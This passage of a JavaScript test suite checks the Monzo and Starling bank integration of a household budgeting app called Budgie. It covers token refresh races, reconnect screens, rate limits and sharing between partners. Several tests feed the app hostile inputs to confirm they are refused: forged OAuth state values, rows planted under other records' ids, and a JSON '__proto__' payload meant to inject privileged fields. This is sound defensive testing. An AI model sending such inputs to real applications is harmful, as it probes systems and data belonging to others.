  monzo.txns = monzoData(planned).concat(Array.from({length: 120}, (_, i) => mtx("tx_r7hold" + i, B.addDays("2026-11-16", -(i % 30)), -(300 + i), {merchant: merchant("Hold " + i, "general"), category: "general", pending: true})));
  const G = bankEnv();
  const bytes = (v) => Buffer.byteLength(String(v), "utf8");
  const strict = (get) => () => { const st = get(); return Object.assign({}, st, {setProperty: (k, v) => { if (bytes(v) > 9 * 1024) throw new Error("Argument too large: value"); st.setProperty(k, v); }}); };
  G.c.PropertiesService = {getScriptProperties: strict(G.c.PropertiesService.getScriptProperties), getUserProperties: strict(G.c.PropertiesService.getUserProperties)};
  connectMonzo(G, {acc_00009main: "e-main"});
  const st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("R7: the status still saves, and the read went through", !st.lastError && st.fullDone && st.accounts.length === 71 && bytes(G.env.props.BANK_STATUS_ethan) <= 9 * 1024 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_tesco"), {err: st.lastError, n: (st.accounts || []).length, size: bytes(G.env.props.BANK_STATUS_ethan)});
  ok("R7: the newest holds are the ones still watched", Object.keys(st.pending || {}).length > 0 && !!st.pending.tx_r7hold0, Object.keys(st.pending || {}).length);
  monzo.pots = pots0;
}

{
  // R8: anyone can open the sign-in return address. A made-up state (the right shape) is turned away without taking the
  // bank lock, so a stream of them can't hold up the reads; a real one still works, once
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); let locks = 0;
  const L = G.c.LockService; G.c.LockService = Object.assign({}, L, {getUserLock: () => { const l = L.getUserLock(); return Object.assign({}, l, {tryLock: (ms) => { locks++; return l.tryLock(ms); }}); }});
  for (let i = 0; i < 5; i++) G.c.doGet({parameter: {code: "x", state: require("crypto").randomBytes(32).toString("hex")}});
  ok("R8: made-up states never take the lock", locks === 0, locks);
  connectMonzo(G);
  ok("R8: a real sign-in still connects", !!G.env.userProps.BANK_TOKEN_ethan && locks > 0);
}

{
  // R9: a connection that needs reconnecting shows Reconnect (Monzo) and Disconnect, not the first-time form (whose
  // Connect the sheet turns down while a connection is kept: "Disconnect Monzo first", with no way to do that)
  const app = fs.readFileSync(path.join(__dirname, "../app.js"), "utf8");
  const src = app.slice(app.indexOf("SCREENS.bank = function () {"), app.indexOf("// new payments from the bank"));
  const render = (bank, personBank) => {
    const ctx = {SCREENS: {}, S: {bank: bank, cfg: {u: "https://script.google.com/macros/s/X/exec"}, ui: {}}, B: {accountsOf: () => [{id: "e-main", name: "Main"}], mainOf: () => "e-main", accName: (d, id) => id, nice: (x) => x},
      demoOn: () => false, person: () => ({bank: personBank}), card: (h) => "<div class=card>" + h + "</div>", esc: (x) => String(x), bankRefresh: () => {}, db: () => ({}), me: () => "ethan",
      M: (n) => "£" + n, ago: () => "now", reviewRows: () => [], bankName: () => bank.provider === "starling" ? "Starling" : "Monzo"};
    vm.createContext(ctx); vm.runInContext(src, ctx); return ctx.SCREENS.bank();
  };
  const base = {connected: false, needsReconnect: true, needsSetup: false, accounts: [{extId: "acc_1", name: "Current", kind: "main", mappedTo: "e-main"}], lastError: "Monzo needs reconnecting"};
  const mz = render(Object.assign({provider: "monzo"}, base), "Monzo"), sl = render(Object.assign({provider: "starling"}, base), "Starling");
  ok("R9: Monzo needing reconnecting offers Reconnect and Disconnect, not the first-time form", /data-a="bankmonzo2"/.test(mz) && /data-a="bankoff"/.test(mz) && !/id="mzSecret"/.test(mz), mz.slice(0, 200));
  ok("R9: Starling needing reconnecting offers Disconnect, not a token box that can't be used", /data-a="bankoff"/.test(sl) && !/id="stTok"/.test(sl), sl.slice(0, 200));
  ok("R9: never connected still shows the first-time form", /id="mzSecret"/.test(render({provider: "", connected: false, needsReconnect: false, needsSetup: true, accounts: []}, "Monzo")));
}

{
  // R12: the partner's made-up payment between them only hides a payment the bank says went to them, and that's told
  // by their id (set in the sheet), not their name, which they can change to the name of whoever the payer paid
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv();
  const ren = G.call({key: G.kS, ops: [{op: "put", table: "people", row: {id: "sophie", name: "Sam Smith"}}, {op: "put", table: "settlements", row: {id: "set-fake2", date: "2026-11-06", from: "ethan", to: "sophie", amount: 20, note: "paid back"}}]});
  connectMonzo(G, {acc_00009main: "e-main"});
  ok("R12: renaming herself after the person he paid doesn't let her made-up one hide his payment", ren.applied.length === 2 && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_friend" && !r.deleted), ren);
}

{
  // R10: Check now and the 15-minute read refreshing the same token at once (they aren't sure to share a lock): the one
  // whose refresh Monzo turns down (each refresh token works once) waits for the other's new token rather than marking
  // a working connection as needing reconnecting
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const tok = JSON.parse(G.env.userProps.BANK_TOKEN_ethan); tok.expiresAt = NOW - 1000; G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(tok);
  // the other read: its refresh has already been used up at Monzo, and it saves the new token a moment later
  const other = JSON.parse(monzoRoute("post", "https://api.monzo.com/oauth2/token", {payload: {grant_type: "refresh_token", client_id: CLIENT_ID, client_secret: SECRET.clientSecret, refresh_token: tok.refresh}}).body);
  const sleep0 = G.c.Utilities.sleep;
  G.c.Utilities.sleep = () => { const t = JSON.parse(G.env.userProps.BANK_TOKEN_ethan); t.access = other.access_token; t.refresh = other.refresh_token; t.expiresAt = NOW + 6 * 3600000; t.refreshedAt = NOW; G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(t); G.c.Utilities.sleep = sleep0; };
  NOW += 60000; const r = G.call({key: G.kE, action: "bank.syncNow"}), st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("R10: the read goes on with the other's new token and the connection stays fine", r.ok && !st.needsReconnect && JSON.parse(G.env.userProps.BANK_TOKEN_ethan).refresh === other.refresh_token, {r, st: {nr: st.needsReconnect, err: st.lastError}});
  G.c.Utilities.sleep = sleep0;
}

{
  // R11: a read that was using the old connection when you connected again fails, but that says nothing about the new
  // connection, which isn't marked as needing reconnecting
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const tok = JSON.parse(G.env.userProps.BANK_TOKEN_ethan); tok.expiresAt = NOW - 1000; G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(tok);
  const fetch0 = G.c.UrlFetchApp.fetch, fresh = {provider: "monzo", conn: "new-connection-0000000000000000", access: "acc-NEW", refresh: "ref-NEW", expiresAt: NOW + 6 * 3600000, issuedAt: NOW, approvedAt: NOW, userId: "user_00009ETHAN"};
  G.c.UrlFetchApp.fetch = (url, params) => { const out = fetch0(url, params); if (/oauth2\/token/.test(url) && params.payload && params.payload.grant_type === "refresh_token") { G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(fresh); G.env.props.BANK_STATUS_ethan = JSON.stringify({provider: "monzo", accounts: [], lastSync: 0, lastError: "", fullDone: true}); } return out; };
  NOW += 60000; const r = G.call({key: G.kE, action: "bank.syncNow"}), st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("R11: the old read stops, and the new connection isn't marked as needing reconnecting", !r.ok && !st.needsReconnect && JSON.parse(G.env.userProps.BANK_TOKEN_ethan).conn === fresh.conn, {r, st});
  G.c.UrlFetchApp.fetch = fetch0;
}

{
  // T1: an id names one thing whatever its tab. The partner can't make a split (or goal, transfer, loan) called after
  // the payer's main account, which made the bank feed skip every one of his payments, nor an income called after his
  // private bill, which made the bank's "the bill came to £61.23" hers to see and change
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = [mtx("tx_energy", "2026-11-10", -6123, {counterparty: {name: "ENERGY CO"}, category: "bills"})];
  const G = bankEnv(t => { t.bills.push({id: "e-energy", person: "ethan", name: "Energy", amount: 50, account: "e-main", unit: "month", on: "10", start: "2026-11-01", variable: true}); });
  connectMonzo(G, {acc_00009main: "e-main"});
  ok("T1: the bank's amount for his private bill is saved", grow(G, "exceptions").some(x => x.id === "x-e-energy-2026-11-10-bank-ethan" && x.amount === 61.23));
  const plant = G.call({key: G.kS, ops: [
    {op: "put", table: "splits", row: {id: "e-main", name: "Ours", shares: "sophie:1"}},
    {op: "put", table: "goals", row: {id: "e-bills", owners: "sophie", name: "Mine", target: 10}},
    {op: "put", table: "transfers", row: {id: "e-food", from: "sophie", to: "ethan", name: "x", amount: 1, unit: "once", start: "2030-01-01"}},
    {op: "put", table: "income", row: {id: "e-energy", person: "sophie", name: "x", amount: 1, account: "s-main", unit: "once", start: "2030-01-01"}},
    {op: "put", table: "budgets", row: {id: "e-pay", person: "sophie", name: "x", amount: 1, mode: "oneoff"}},
    {op: "put", table: "splits", row: {id: "split-new-1", name: "Thirds", shares: "ethan:2, sophie:1"}}
  ]});
  ok("T1: a new row can't take an id another tab uses (her own new split still saves; the refusal looks like any other)", plant.applied.length === 1 && plant.applied[0].id === "split-new-1" && plant.rejected.length === 5 && plant.rejected.every(x => /^You can.t change that/.test(x.error) && x.retry === false), plant);
  const seen = G.call({key: G.kS, full: true});
  ok("T1: the partner still can't see the bank's amount for his private bill", !seen.rows.exceptions.some(x => /e-energy/.test(x.id)), seen.rows.exceptions);
  monzo.txns.push(mtx("tx_boots", "2026-11-16", -1234, {merchant: merchant("Boots", "shopping"), category: "shopping"}));
  NOW += 60000; const sn = G.call({key: G.kE, action: "bank.syncNow"});
  ok("T1: and his next payment still comes in", sn.ok && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_boots" && r.account === "e-main"), sn);
}
{
  // T1b: an id already in two tabs (only by typing into the sheet) belongs to nobody: its changes can't be seen or made
  // by either of you, and the bank feed doesn't make one for it; and an account another tab's row shares an id with
  // still takes the bank's payments
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = [mtx("tx_energy", "2026-11-10", -6123, {counterparty: {name: "ENERGY CO"}, category: "bills"})];
  const G = bankEnv(t => {
    t.bills.push({id: "e-energy", person: "ethan", name: "Energy", amount: 50, account: "e-main", unit: "month", on: "10", start: "2026-11-01", variable: true});
    t.income.push({id: "e-energy", person: "sophie", name: "x", amount: 1, account: "s-main", unit: "once", start: "2030-01-01"});
    t.exceptions.push({id: "x-e-energy-2026-12-10-skip", item: "e-energy", date: "2026-12-10", action: "skip"});
    t.splits.push({id: "e-main", name: "Typed in", shares: "sophie:1"});
  });
  connectMonzo(G, {acc_00009main: "e-main"});
  monzo.txns.push(mtx("tx_boots", "2026-11-12", -1234, {merchant: merchant("Boots", "shopping"), category: "shopping"}));
  NOW += 60000; G.call({key: G.kE, action: "bank.syncNow"});
  const so = G.call({key: G.kS, full: true}), ed = G.call({key: G.kS, ops: [{op: "put", table: "exceptions", row: {id: "x-e-energy-2026-12-10-skip", item: "e-energy", date: "2026-12-10", action: "amount", amount: 5}}]});
  ok("T1b: an item id in two tabs: its changes are nobody's to see or make", !so.rows.exceptions.some(x => /e-energy/.test(x.id)) && ed.rejected.length === 1 && ed.applied.length === 0, {ex: so.rows.exceptions, ed});
  ok("T1b: and the bank doesn't make one for it", !grow(G, "exceptions").some(x => x.id === "x-e-energy-2026-11-10-bank-ethan"));
  ok("T1b: an account sharing its id with another tab's row still takes the bank's payments", grow(G, "transactions").some(r => r.id === "bk-monzo-tx_boots" && r.account === "e-main") && grow(G, "valuations").some(v => v.id === "bk-acc_00009main-2026-11-17"), grow(G, "transactions").map(r => r.id));
}

{
  // T2: Peckish (which both of you see) posting a shop for the payer, at any amount near a payment somewhere else: the
  // shop isn't linked to it, so Peckish never learns that payment's amount and it isn't hidden under the food shop.
  // A shop that names the same shop is still linked.
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = [mtx("tx_old", "2026-11-01", -100, {merchant: merchant("Coffee Place", "eating_out"), category: "eating_out"})];
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const link = G.call({key: G.kE, action: "app.link", app: "peckish"}).link, pk = JSON.parse(Buffer.from(link.split("#connect=")[1], "base64url").toString()).k;
  const shop = (id, date, amount, note) => ({op: "put", table: "transactions", row: {id: id, date: date, person: "ethan", amount: amount, budget: "e-food-b", account: "", split: "", note: note, source: "peckish"}});
  const put = G.call({key: pk, ops: [shop("t-pk-probe1", "2026-11-12", 20, "Tesco (Peckish)"), shop("t-pk-real1", "2026-11-14", 40, "Aldi (Peckish)")]});
  monzo.txns.push(mtx("tx_pharm", "2026-11-13", -1650, {merchant: merchant("Boots Pharmacy", "personal_care"), category: "personal_care"}), mtx("tx_aldi", "2026-11-14", -4312, {merchant: merchant("ALDI STORES 123", "groceries"), category: "groceries"}));
  NOW += 60000; G.call({key: G.kE, action: "bank.syncNow"});
  const seen = G.call({key: pk}).rows.transactions, probe = seen.find(r => r.id === "t-pk-probe1"), real = seen.find(r => r.id === "t-pk-real1");
  ok("T2: the shops were saved", put.applied.length === 2, put);
  ok("T2: a Peckish shop naming another shop doesn't take over a payment somewhere else", probe && probe.amount === 20 && !grow(G, "transactions").find(r => r.id === "t-pk-probe1").bankId, probe);
  ok("T2: that payment comes in as itself", grow(G, "transactions").some(r => r.id === "bk-monzo-tx_pharm" && r.note === "Boots Pharmacy" && r.amount === 16.5));
  ok("T2: a shop that names the same shop is still linked, at the bank's amount", real && real.amount === 43.12 && grow(G, "transactions").find(r => r.id === "t-pk-real1").bankId === "tx_aldi" && !grow(G, "transactions").some(r => r.id === "bk-monzo-tx_aldi"), real);
}

{
  // T3: a big payment from the partner just before payday isn't taken for the pay (it used to be, being first)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = monzoData(planned).concat([mtx("tx_sophie_big", "2026-10-27", 150000, {counterparty: {name: "SOPHIE D"}, category: "transfers"})]);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const px = grow(G, "exceptions").find(x => x.id === "x-e-pay-2026-10-29-bank-ethan");
  ok("T3: the pay is the pay, not the partner's payment two days before", px && px.amount === 2390, px);
}

{
  // T4: a hold from the first day a read goes back to, earlier that day than the read starts, isn't taken off as
  // vanished (the read never looked at that part of the day)
  freshMonzo(); NOW = RealDate.parse("2026-11-16T12:00:00Z");
  monzo.txns = monzoData(planned).concat([mtx("tx_oldhold", "2026-10-13", -4000, {merchant: merchant("Hotel Stay", "holidays"), category: "holidays", pending: true, time: "09:00:00"})]);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const had = grow(G, "transactions").find(r => r.id === "bk-monzo-tx_oldhold");
  NOW = RealDate.parse("2026-11-17T12:00:00Z"); G.call({key: G.kE, action: "bank.syncNow"});
  const now = grow(G, "transactions").find(r => r.id === "bk-monzo-tx_oldhold");
  ok("T4: a hold the read didn't cover isn't taken off", had && !had.deleted && now && !now.deleted, {had, now});
}

{
  // T5: disconnected and connected again while a read was going (the phone's Check now and the 15-minute read aren't
  // sure to share a lock): the old read doesn't mark the new connection approved, or save what it read
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  monzo.txns.push(mtx("tx_during", "2026-11-17", -999, {merchant: merchant("Corner Shop", "groceries"), category: "groceries"}));
  const fetch0 = G.c.UrlFetchApp.fetch, fresh = {provider: "monzo", conn: "new-connection-1111111111111111", access: "acc-NEW", refresh: "ref-NEW", expiresAt: NOW + 6 * 3600000, issuedAt: NOW, approvedAt: 0, userId: "user_00009ETHAN"};
  const waitSt = {provider: "monzo", waiting: true, firstUntil: NOW + 20 * 60000, fullDone: false, accounts: [], lastSync: 0, lastError: ""};
  G.c.UrlFetchApp.fetch = (url, params) => { const out = fetch0(url, params); if (/\/transactions\?/.test(url) && !G.env.userProps.BANK_TOKEN_ethan.includes(fresh.conn)) { G.env.userProps.BANK_TOKEN_ethan = JSON.stringify(fresh); G.env.props.BANK_STATUS_ethan = JSON.stringify(waitSt); } return out; };
  NOW += 60000; const r = G.call({key: G.kE, action: "bank.syncNow"}); G.c.UrlFetchApp.fetch = fetch0;
  const st = JSON.parse(G.env.props.BANK_STATUS_ethan), tk = JSON.parse(G.env.userProps.BANK_TOKEN_ethan);
  ok("T5: the new connection still waits for its approval", !r.ok && st.waiting === true && st.fullDone === false && !st.lastSync && tk.approvedAt === 0 && tk.conn === fresh.conn, {r, st, a: tk.approvedAt});
  ok("T5: and the old read's payments weren't saved", !grow(G, "transactions").some(x => x.id === "bk-monzo-tx_during"));
}

{
  // T6: a first import that keeps failing part-way stops being tried every minute after a few goes (each try is trigger
  // time from the owner's daily allowance); the 15-minute read carries on with it
  const big = []; for (let i = 0; i < 1000; i++) big.push(mtx("tx_big" + String(i).padStart(4, "0"), B.addDays("2024-01-01", i), -(100 + i), {merchant: merchant("Corner Shop", "general"), category: "general"}));
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = big.concat(monzoData(planned)); monzo.pageDelay = 30000;
  const G = bankEnv(); connectMonzo(G); monzo.pageDelay = 0;
  const minute = () => G.env.triggers.some(t => t.getHandlerFunction() === "bankPendingImports");
  ok("T6: the first part came in and the rest waits", JSON.parse(G.env.props.BANK_STATUS_ethan).cursor && minute());
  const fetch0 = G.c.UrlFetchApp.fetch;
  G.c.UrlFetchApp.fetch = (url, params) => /\/transactions\?/.test(url) ? {getResponseCode: () => 500, getContentText: () => "{}", getHeaders: () => ({})} : fetch0(url, params);
  const left = []; for (let i = 0; i < 4; i++) { NOW += 60000; G.c.bankPendingImports(); left.push(minute()); }
  ok("T6: after three failed minutes it stops running every minute", JSON.stringify(left) === JSON.stringify([true, true, false, false]), left);
  G.c.UrlFetchApp.fetch = fetch0; NOW += 15 * 60000; G.c.bankPoll();
  const st = JSON.parse(G.env.props.BANK_STATUS_ethan);
  ok("T6: the 15-minute read finishes it", st.fullDone && !st.cursor && !st.minuteFails && grow(G, "transactions").filter(r => /^bk-monzo-tx_big/.test(r.id)).length === 1000, {fullDone: st.fullDone, cursor: st.cursor, mf: st.minuteFails});
}

{
  // T7: a Starling euro account isn't read (its amounts would be taken as pounds)
  NOW = RealDate.parse("2026-11-17T12:00:00Z");
  const acc0 = starling.accounts; starling.accounts = acc0.concat([{accountUid: "sacc-eur", accountType: "ADDITIONAL", defaultCategory: "scat-eur", currency: "EUR", createdAt: "2026-06-01T09:00:00.000Z", name: "Euros"}]);
  const G = bankEnv(), r = G.call({key: G.kS, action: "bank.starling.setToken", token: SECRET.starling}), st = G.call({key: G.kS, action: "bank.status"}).bank;
  ok("T7: only the pound accounts are read", r.ok && !r.note && !st.accounts.some(a => a.extId === "sacc-eur") && st.accounts.some(a => a.extId === "sacc-0001") && !reqs.some(q => /sacc-eur/.test(q.url)), {r, accts: st.accounts.map(a => a.extId)});
  starling.accounts = acc0;
}

{
  // T8: changing the bank details over and over can't use up the owner's emails (100 a day, the Sunday emails need
  // them too): the first few are sent, the last of them saying so
  const G = bankEnv();
  for (let i = 0; i < 12; i++) G.call({key: G.kS, action: "bank.monzo.setClient", clientId: "oauth2client_000SOPH" + i, clientSecret: "mnzconf.sophie" + i});
  ok("T8: at most five notices in a few hours", G.env.mail.length === 5 && /won't be emailed/.test(G.env.mail[4].body) && !/won't be emailed/.test(G.env.mail[0].body), G.env.mail.length);
}

{
  // T9: the sign-in page, which anyone can open, turns away made-up states without reading any properties (each read
  // is from the owner's daily allowance, which every Budgie request needs); a real sign-in still connects
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); let reads = 0;
  G.call({key: G.kE, action: "bank.monzo.setClient", clientId: CLIENT_ID, clientSecret: SECRET.clientSecret});
  const real = new URL(G.call({key: G.kE, action: "bank.monzo.authUrl"}).url).searchParams.get("state");
  const ps0 = G.c.PropertiesService, count = (store) => new Proxy(store, {get: (t, k) => (/^getPropert/.test(k) && reads++, t[k])});
  G.c.PropertiesService = {getScriptProperties: () => count(ps0.getScriptProperties()), getUserProperties: () => count(ps0.getUserProperties())};
  const pages = []; for (let i = 0; i < 20; i++) pages.push(G.c.doGet({parameter: {code: "x", state: require("crypto").randomBytes(32).toString("hex")}}).getContent());
  ok("T9: made-up states are turned away without a property read", reads === 0 && pages.every(h => /expired or didn't come from Budgie/.test(h)), reads);
  G.c.PropertiesService = ps0;
  ok("T9: a real sign-in still connects", /Budgie is connected to Monzo/.test(G.c.doGet({parameter: {code: SECRET.code, state: real}}).getContent()));
}

{
  // T10: a mapping setting with an odd name (typed on the phone, say) doesn't break the status or the reads
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  G.call({key: G.kE, ops: [{op: "put", table: "settings", row: {id: "ethan:bank.map.hasOwnProperty", person: "ethan", key: "bank.map.hasOwnProperty", value: "e-main"}}]});
  monzo.txns.push(mtx("tx_odd", "2026-11-17", -321, {merchant: merchant("Corner Shop", "groceries"), category: "groceries"}));
  NOW += 60000; const st = G.call({key: G.kE, action: "bank.status"}), sn = G.call({key: G.kE, action: "bank.syncNow"});
  ok("T10: an odd mapping name doesn't break the status or the next read", st.ok && sn.ok && grow(G, "transactions").some(r => r.id === "bk-monzo-tx_odd"), {st: st.error, sn});
}

// ================= round 6 review =================
{
  // U1: a spending Space has its own feed, and Starling lists a move to or from it there too. Only the main account's
  // side is the move: the Space's side is neither a payment (that would count it twice) nor money in (where a top-up
  // the size of the pay could be taken for the pay). A Space Budgie can't see (no savings-goal:read box) is the same.
  NOW = RealDate.parse("2026-11-30T12:00:00Z");
  const feed0 = starling.feed.slice();
  starling.identity[SECRET.starlingSpaces] = ["account-list:read", "balance:read", "transaction:read", "savings-goal:read", "space:read"];
  starling.feed.push(
    sfi("sfi-u1-tofun", "2026-11-26", 190000, "OUT", {source: "INTERNAL_TRANSFER", counterPartyType: "CATEGORY", counterPartyUid: "scat-fun", counterPartyName: "Fun money"}),
    sfi("sfi-u1-funin", "2026-11-26", 190000, "IN", {categoryUid: "scat-fun", source: "INTERNAL_TRANSFER", counterPartyType: "CATEGORY", counterPartyUid: "scat-0001", counterPartyName: "Personal"}),
    sfi("sfi-u1-pay", "2026-11-27", 210000, "IN", {source: "FASTER_PAYMENTS_IN", counterPartyType: "PAYEE", counterPartyName: "EMPLOYER LTD"}),
    sfi("sfi-u1-funout", "2026-11-28", 1000, "OUT", {categoryUid: "scat-fun", source: "INTERNAL_TRANSFER", counterPartyType: "CATEGORY", counterPartyUid: "scat-0001", counterPartyName: "Personal"}),
    sfi("sfi-u1-back", "2026-11-28", 1000, "IN", {source: "INTERNAL_TRANSFER", counterPartyType: "CATEGORY", counterPartyUid: "space-fun", counterPartyName: "Fun money"}),
    sfi("sfi-u1-hidden", "2026-11-29", 4000, "OUT", {source: "INTERNAL_TRANSFER", counterPartyType: "CATEGORY", counterPartyUid: "goal-unseen", counterPartyName: "Holiday"}),
    sfi("sfi-u1-hiddenback", "2026-11-29", 200000, "IN", {source: "INTERNAL_TRANSFER", counterPartyType: "CATEGORY", counterPartyUid: "goal-unseen", counterPartyName: "Holiday"})
  );
  const G = bankEnv();
  ok("U1: connected", G.call({key: G.kS, action: "bank.starling.setToken", token: SECRET.starlingSpaces}).ok);
  G.call({key: G.kS, action: "bank.map", extId: "space-fun", account: "s-rent"}); NOW += 60000; G.call({key: G.kS, action: "bank.syncNow"});
  const tx = grow(G, "transactions").filter(r => /sfi-u1-/.test(r.id)), mv = grow(G, "moves").filter(r => /sfi-u1-/.test(r.id));
  const pay = grow(G, "exceptions").filter(r => /^x-s-pay-/.test(r.id));
  ok("U1: the Space's side of a move is never a payment, nor a Space Budgie can't see", tx.length === 0, tx.map(r => [r.id, r.amount, r.note]));
  ok("U1: each move comes in once, from the main account's side (named by its Space or its category)", mv.length === 2 && mv.some(m => m.id === "bk-starling-sfi-u1-tofun" && m.from === "s-main" && m.to === "s-rent" && m.amount === 1900) && mv.some(m => m.id === "bk-starling-sfi-u1-back" && m.from === "s-rent" && m.to === "s-main" && m.amount === 10), mv.map(m => [m.id, m.from, m.to, m.amount]));
  ok("U1: a top-up of a Space isn't taken for the pay", pay.every(x => +x.amount === 2100), pay.map(x => [x.id, x.amount]));
  starling.feed = feed0;
}
{
  // U2: the pay is the money in that's most like it: not a Monzo top-up (is_load), not a pay-sized transfer from
  // savings two days before. And a later read that no longer covers the pay itself leaves the pay's amount alone,
  // rather than taking money in a couple of days after it for the pay
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z");
  monzo.txns = monzoData(planned).concat([
    mtx("tx_u2_topup", "2026-10-28", 235000, {is_load: true, description: "Top up", category: "general", time: "07:00:00"}),
    mtx("tx_u2_isa", "2026-10-27", 240000, {counterparty: {name: "CASH ISA PROVIDER"}, category: "transfers", time: "07:00:00"})
  ]);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  const payX = () => grow(G, "exceptions").filter(r => /^x-e-pay-2026-10-29/.test(r.id)).map(r => +r.amount);
  ok("U2: a top-up or a transfer from savings isn't taken for the pay", JSON.stringify(payX()) === "[2390]", payX());
  monzo.txns.push(mtx("tx_u2_later", "2026-10-31", 230000, {counterparty: {name: "A FRIEND"}, category: "general", time: "12:00:00"}));
  NOW = RealDate.parse("2026-12-03T12:00:00Z"); G.c.bankPoll();
  ok("U2: a read that doesn't reach back to the pay leaves its amount as it was", JSON.stringify(payX()) === "[2390]" && !G.call({key: G.kE, action: "bank.status"}).bank.lastError, payX());
}
{
  // U3: one bank login is one person's. A Monzo account or Starling account holder already connected for one of you
  // is turned away for the other (their payments would come in as the other's, for them to see)
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(); connectMonzo(G, {acc_00009main: "e-main"});
  G.call({key: G.kS, action: "bank.monzo.setClient", clientId: CLIENT_ID, clientSecret: SECRET.clientSecret});
  const st = new URL(G.call({key: G.kS, action: "bank.monzo.authUrl"}).url).searchParams.get("state");
  const n0 = reqs.length, html = G.c.doGet({parameter: {code: SECRET.code, state: st}}).getContent();
  ok("U3: Ethan's Monzo can't be connected for Sophie too", !G.env.userProps.BANK_TOKEN_sophie && /already connected/.test(html) && reqs.slice(n0).some(r => r.method === "post" && /\/oauth2\/logout$/.test(r.url)) && !grow(G, "transactions").some(r => r.person === "sophie" && /^bk-monzo-/.test(r.id)), html);
  ok("U3: and Ethan's connection is untouched", G.call({key: G.kE, action: "bank.status"}).bank.connected === true);
  const H = bankEnv();
  starling.identity[SECRET.starlingSpaces] = ["account-list:read", "balance:read", "transaction:read", "savings-goal:read", "space:read"];
  ok("U3: Sophie connects Starling", H.call({key: H.kS, action: "bank.starling.setToken", token: SECRET.starling}).ok);
  const e1 = H.call({key: H.kE, action: "bank.starling.setToken", token: SECRET.starling}), e2 = H.call({key: H.kE, action: "bank.starling.setToken", token: SECRET.starlingSpaces});
  ok("U3: her Starling (the same token, or another for the same account) can't be connected for Ethan", !e1.ok && !e2.ok && /already connected/.test(e2.error) && !H.env.userProps.BANK_TOKEN_ethan && !grow(H, "transactions").some(r => r.person === "ethan" && /^bk-starling-/.test(r.id)), {e1, e2});
  ok("V10: and the owner is told, as for Monzo", H.env.mail.some(m => /Ethan's bank connection/.test(m.subject) && /Starling account that's already connected/.test(m.body)), H.env.mail.map(m => m.body.slice(0, 80)));
}
{
  // U4: a change carrying a "__proto__" field (as JSON.parse gives it) can't slip in fields the rules skip, such as
  // the bank link, which only the bank feed sets
  const G = bankEnv();
  const body = JSON.parse('{"key":"' + G.kS + '","ops":[{"op":"put","table":"transactions","row":{"id":"t-u4","date":"2026-11-10","person":"sophie","amount":4,"budget":"s-food","__proto__":{"bankId":"tx_tesco","review":true,"splitHint":"half"}}},' +
    '{"op":"put","table":"transactions","row":{"id":"t-u4b","date":"2026-11-10","person":"sophie","amount":4,"__proto__":{"person":"ethan"}}}]}');
  const r = G.call(body), row = grow(G, "transactions").find(x => x.id === "t-u4"), rowB = grow(G, "transactions").find(x => x.id === "t-u4b");
  ok("U4: a __proto__ field is ignored", r.ok && row && !row.bankId && row.review !== true && !row.splitHint && rowB && rowB.person === "sophie", {r, row, rowB});
}
{
  // U5: one bank payment is a payment or a move, never both. A Moneybox payment read before there was a LISA or ISA
  // to put it in came in as a payment; once there is one, it becomes the move (the payment, not yet checked, goes),
  // and if the account goes again the move stays rather than the payment coming back beside it
  freshMonzo(); NOW = RealDate.parse("2026-11-17T12:00:00Z"); monzo.txns = monzoData(planned);
  const G = bankEnv(t => {
    t.accounts = t.accounts.filter(a => a.id !== "e-lisa" && a.id !== "e-isa"); t.budgets = t.budgets.filter(b => b.id !== "e-lisa-b" && b.id !== "e-isa-b");
    t.goals = []; t.valuations = t.valuations.filter(v => v.account !== "e-lisa");
  });
  connectMonzo(G, {acc_00009main: "e-main"});
  const live = (t) => grow(G, t).filter(r => r.id === "bk-monzo-tx_moneybox" && r.deleted !== true);
  ok("U5: with nowhere to put it, the Moneybox payment is a payment", live("transactions").length === 1 && live("moves").length === 0);
  G.call({key: G.kE, ops: [{op: "put", table: "accounts", row: {id: "e-lisa9", owner: "ethan", name: "Lifetime ISA", kind: "lisa", order: 8}}]});
  NOW += 15 * 60000; G.c.bankPoll();
  ok("U5: once there's a LISA it's the move, and only the move", live("moves").length === 1 && live("moves")[0].to === "e-lisa9" && live("transactions").length === 0, {mv: live("moves").length, tx: live("transactions").length});
